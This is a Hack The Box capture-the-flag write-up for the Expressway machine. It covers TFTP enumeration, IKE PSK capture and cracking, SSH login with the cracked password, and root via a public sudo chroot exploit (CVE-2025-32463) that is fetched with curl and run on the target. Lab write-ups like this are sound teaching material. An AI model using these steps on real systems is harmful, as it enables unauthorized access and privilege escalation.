# Expressway Machine

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Linux (Easy)

<img width="1569" height="178" alt="image" src="https://github.com/user-attachments/assets/df613c4a-d015-4eeb-9ade-e0fd9ca99d51" />


## Overview

In this write-up, we will solve the Expressway machine by 
- enumerating a TFTP server
- recovering a VPN pre-shared key (PSK), gaining SSH access
- finally exploiting a vulnerable sudo version to obtain root privileges.

## Tools Used

* Nmap
* Hashcat
* ike-scan

## Steps

### 1. Simple Recon 

Start the machine and add its IP address to your /etc/hosts file.

First, perform a TCP scan to identify open ports:

```
nmap -Pn <machine_ip>
```

There are one open port:

* SSH

Next, perform a UDP scan :

```
nmap -Pn -sU <machine_ip>
```

The scan reveals UDP port 69 running TFTP.

**Summary of TFTP**:

Trivial File Transfer Protocol (TFTP) is a simple, lockstep file transfer protocol that uses UDP port 69. 

It's designed to be simple and easy to implement, lacking the authentication and features of FTP. 

TFTP is commonly used for booting diskless workstations, uploading configurations to network devices, and firmware updates. 

Unlike FTP, TFTP provides no authentication mechanism, making it a potential security risk when misconfigured.

### 2. Enumerating the TFTP Server

Nmap includes scripts that can enumerate TFTP services.
```
nmap -Pn expressway.htb -p 69 -sU --script=tftp*
```
the result showed that there exists file named ciscortr.cfg on the server.

let's open the server and get the file.

### 3. Analyze the file

```
tftp expressway.htb  #for opening the server
get ciscortr.cfg     #for downloading the file on your host
quit
```
print the file content
```
cat ciscortr.cfg
```

While reviewing the file, I found two important hint:
1- The hostname is expressway.
2- There is username called ike.
let's search what is IKE.

Summery of IKE:

Internet Key Exchange (IKE) is a protocol used to establish secure communication channels for IPsec VPNs. It handles authentication and key exchange between communicating devices.

Okey, there is a scanner for enumerating IKE. you can download from [here](https://github.com/royhills/ike-scan)

```
git clone https://github.com/royhills/ike-scan.git 
cd ike-scan
ike-scan -M expressway.htb   # -M for multiple line printing
```
The result showed that use PSK as Authentication method, the hash type is sha1, and encryption is 3DES.

Summery of PSK:
A Pre-Shared Key (PSK) is a secret shared between two parties before establishing a VPN connection.

If the PSK is weak, it may be vulnerable to offline cracking attacks.

### 4. Crack the PSK

download the key
```
ike-scan -M expressway.htb -A --pskcrack=key.hash  # -A --> --aggressive , key.hash --> output file
```
Crack it use hashcat
```
hashcat key.hash /usr/share/wordlists/rockyou.txt
```
The result: freakingrockstarontheroad

### 5. Gaining Initial Access

Using the username discovered earlier and the recovered PSK, connect via SSH

```
ssh ike@expressway
```
Enter the password:

freakingrockstarontheroad

You should now have a shell on the target machine.

### 6. Get the user flag

List the files:
```
ls
```
You should see: user.txt

Display the flag:
```
cat user.txt
```

Congratulations! The user flag has been obtained.

### 7. Privilege Escalation

First, check whether the user has any sudo privileges:
```
sudo -l
```
Although the user cannot execute commands through sudo normally, we should still check the installed sudo version.

Okey, let's show the sudo version:
```
sudo -V
```
The result : 1.9.17

let's search if there are exploits for this version

Yesss, it can be exploited using the -R (chroot) option.

let's exploit it by -R

**Idea** :
The vulnerability arises from unsafe handling of the --chroot (-R) option.

An attacker can trick sudo into loading a malicious nsswitch.conf file, resulting in arbitrary code execution as root.

You can download the Poc from [here](https://github.com/kh4sh3i/CVE-2025-32463)


### 8. Exploiting the Vulnerability

On your attacking machine:

```
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
chmod +x exploit.sh
```
Start a simple HTTP server:

```
python3 -m http.server 8000
```
On the target machine, download the exploit:

```
curl http://<your_vpn_ip>:8000/exploit.sh -o exploit.sh
chmod +x exploit.sh
./exploit.sh
```

### 9. Get the Root Flag
Verify that the privilege escalation succeeded:
```
id
```
Yesss, we bacame root uid=0(root) gid=0(root).

We now have root privileges. Let's navigate to the root directory
```
cd /root
cat root.txt
```
Voilaa, we successfully get the root flag and the machine is done.

#

[The Machine Link](https://app.hackthebox.com/machines/Expressway?sort_by=created_at&sort_type=desc)

See you in the next write-up!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
